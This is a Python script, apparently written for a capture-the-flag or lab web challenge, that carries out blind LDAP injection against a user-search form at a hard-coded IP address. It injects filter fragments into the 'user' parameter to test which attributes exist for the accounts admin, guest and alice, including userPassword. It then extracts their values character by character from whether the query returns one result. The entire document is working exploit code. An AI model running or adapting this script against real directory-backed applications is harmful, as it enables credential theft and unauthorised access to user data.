import requests
import string

URL = "http://13.53.139.173/web1/"

def search(user):
    r = requests.get(URL, params={"user": user, "dept": "All", "office": "Any"})
    return "1 result" in r.text

# Test known users
print("Testing known users:")
for user in ["admin", "guest", "alice"]:
    print(f"  {user}: {search(user)}")

# Test blind injection - try to extract description attribute
print("\nTesting blind LDAP injection on description attribute...")
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_-"

# Try to enumerate description of admin user character by character
for base_user in ["admin", "guest", "alice"]:
    print(f"\nTrying to extract data for {base_user}...")
    
    # Test if we can inject at all
    test_payload = f"{base_user})(description="
    if not search(test_payload):
        print(f"  Injection with '(' blocked or doesn't work")
    
    # Try different LDAP attributes
    for attr in ["description", "cn", "sn", "mail", "uid", "userPassword", "info", "comment"]:
        # Try to find if attribute exists with any value
        payload = f"{base_user})({attr}="
        result = search(payload)
        if result:
            print(f"  Found! {attr} attribute exists")
            # Try to extract value
            extracted = ""
            for i in range(50):  # Max 50 chars
                found = False
                for c in charset:
                    test = f"{base_user})({attr}={extracted}{c}"
                    if search(test):
                        extracted += c
                        found = True
                        print(f"    Extracted so far: {extracted}")
                        break
                if not found:
                    break
            if extracted:
                print(f"  Full value: {extracted}")

